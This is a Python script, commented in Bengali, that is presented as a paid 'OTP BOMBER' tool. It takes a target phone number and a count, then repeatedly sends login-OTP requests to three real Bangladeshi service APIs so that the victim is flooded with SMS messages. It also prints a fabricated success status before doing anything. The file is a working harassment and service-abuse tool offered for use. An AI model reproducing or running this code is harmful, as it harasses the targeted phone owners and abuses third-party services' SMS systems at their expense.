import requests
import os
import time
import uuid

def start():
    os.system('clear')
    # আপনার টুলের লোগো (OTP স্টাইল)
    print('          \033[1;32m██████  \033[1;31m████████ \033[1;32m██████  ')
    print('         ██    ██    ██    ██   ██ ')
    print('         ██    ██    ██    ██████  ')
    print('         ██    ██    ██    ██      ')
    print('          ██████     ██    ██      \033[0m')
    
    # ইনফরমেশন বক্স (আপনার চাহিদা অনুযায়ী পরিবর্তন করা হয়েছে)
    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
    print(line)
    print('\033[1;34m| [✓] DEVELOPED BY :  MD MALEK ISLAM        |')
    print('| [✓] TEAM         :  X-BOOM TEAM           |')
    print('| [✓] TOOL STATUS  :  OTP BOMBER            |')
    print('| [✓] GITHUB       :  MR-MALEK              |')
    print('| [✓] TOOL VERSION :  MAX PRO 2026          |\033[0m')
    print(line)
    
    # সালাম এবং টিমের নাম
    print('\033[1;32m[•] SALAMU ALAIKUM.........................\033[0m')
    print(line)
    
    # কি (Key) জেনারেটর - আপনার দেওয়া নাম 'MR-MALEK' শেষে যুক্ত করা হয়েছে
    u_key = str(uuid.uuid4())[:8]
    print(f'\033[1;32m[\033[1;31m❤️\033[1;32m] POWERFUL TOOL 10 DAYS ONLY 50TK [\033[1;31m❤️\033[1;32m]')
    print(f'[\033[1;31m❤️\033[1;32m] KEY : {u_key}-MR-MALEK')
    print(f'[\033[1;31m❤️\033[1;32m] COPY YOUR KEY AND SEND TO THE ADMIN [\033[1;31m❤️\033[1;32m]\033[0m')
    print(line)

    target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
    amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))
    
    # সাকসেস মেসেজ স্টাইল
    print(f'\n\033[1;32mSuccess: True')
    print('Status Code: 200')
    print(f'Message: {target} যুক্ত হয়েছে।\033[0m\n')
    
    # আপনার দেওয়া Bdtickets এবং অন্যান্য API
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

    for i in range(1, amount + 1):
        try:
            # API রিকোয়েস্টগুলো
            requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, headers=headers, timeout=10)
            requests.post("https://api.sharetrip.net/api/v1/otp/send", json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=10)
            requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=10)
            
            # আউটপুট ডিসপ্লে
            print(f'\033[1;32m[{i}] SUCCESS SENT ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] FAILED SENT ==> {target}\033[0m')
        
        # ৪ সেকেন্ড বিরতি
        time.sleep(4)

if __name__ == "__main__":
    start()
